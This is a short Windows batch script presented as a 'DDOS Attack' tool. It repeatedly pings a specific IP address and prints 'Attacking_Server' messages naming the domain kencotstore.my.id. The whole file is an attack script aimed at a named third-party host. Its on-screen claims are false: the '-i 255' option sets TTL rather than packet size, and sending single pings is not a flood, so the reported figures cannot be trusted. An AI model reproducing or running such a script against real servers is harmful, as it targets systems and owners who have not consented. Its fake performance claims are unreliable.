@echo off
color 0d
mode 90,17
title DDOS Attack By $LH$CK
cls
set /a nilaiawal=1
set /a nilaiakhir=86400
:DDOS
ping -n 1 google.com >nul
if errorlevel 1 (
    timeout /t 1 /nobreak >nul
    echo Failed to request, Connection Lost
    goto DDOS
)
:connection
if %nilaiawal% leq %nilaiakhir% (
    set /a nilaiawal=%nilaiawal%+1
    echo Attacking_Server : kencotstore.my.id Packet_Size : 255 KB/s Icmp_Seq : %nilaiawal% ID_Server : [%random%]
    ping -i 255 -n 1 45.156.25.166 >nul
    goto DDOS
)